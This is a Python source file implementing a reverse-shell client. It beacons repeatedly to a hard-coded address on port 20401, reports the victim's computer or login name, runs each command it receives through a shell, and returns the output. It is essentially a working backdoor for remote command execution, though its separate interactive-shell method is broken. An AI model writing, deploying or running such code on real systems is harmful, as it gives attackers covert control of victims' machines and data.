import socket
from multiprocessing import Pipe, Process
from subprocess import Popen, TimeoutExpired, PIPE, check_call
import os, sys
import time


class ReverseShell:
    def __init__(self, sleep=900, timeout=300, buffer=4096):
        self._buffer_size = buffer
        self._shell_proc = None
        self._codec = 'cp866'
        self._conn = socket.socket()
        self.sleep_sec = sleep
        self.timeout = timeout

    def open(self, host, port=20401):
        conn = self._try_connect(socket.socket(), host, port)
        while True:
            try:
                cmd = conn.recv(self._buffer_size).decode()
                self.analyze_cmd(cmd, conn)
            except socket.timeout as err:
                print(err)
                self._shutdown_connection(conn)
                conn = self._try_connect(socket.socket(), host, port)
                continue
            except ConnectionError as err:
                print(err)
                self._shutdown_connection(conn)
                conn = self._try_connect(socket.socket(), host, port)
                continue

    def analyze_cmd(self, command, connection):
        if command == 'shell':
            self.open_shell(connection)
            # connection.send(b'shell opened')
        else:
            connection.send(self.execute(command))

    def open_shell(self, connection):
        if os.name == 'nt':
            open_cmd = 'cmd.exe'
        else:
            open_cmd = '/bin/sh'

        process = Process(target=open_cmd)
        while True:
            cmd = connection.recv(self._buffer_size)
            if cmd == 'exit':
                process.terminate()
                break
            process.__setattr__('args', cmd.decode())
            out = process.start()
            connection.send(out.encode())
            process.terminate()

    def execute(self, command):
        proc = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        out, err = proc.communicate()
        proc.terminate()
        return out + err

    def _try_connect(self, connection, host, port):
        if os.name == 'nt':
            pc_name = os.environ.get('COMPUTERNAME')
        else:
            pc_name = os.environ.get('LOGNAME')

        while True:
            status = connection.connect_ex((host, port))
            if status == 10056:
                break
            if status == 0:
                print('Connected')
                break
            print('{}: Trying to connect'.format(status))
            time.sleep(self.sleep_sec)

        connection.settimeout(self.timeout)
        connection.send(pc_name.encode())
        return connection

    def _shutdown_connection(self, conn):
        conn.close()
        time.sleep(self.sleep_sec)

    def print(self, *msgs, end='\n'):
        for msg in msgs:
            if not isinstance(msg, str):
                msg = msg.decode(self._codec)
            sys.stdout.write(msg + end)
        sys.stdout.flush()



if __name__ == '__main__':
    shell = ReverseShell(sleep=10, timeout=60)
    shell.open('192.168.0.20')
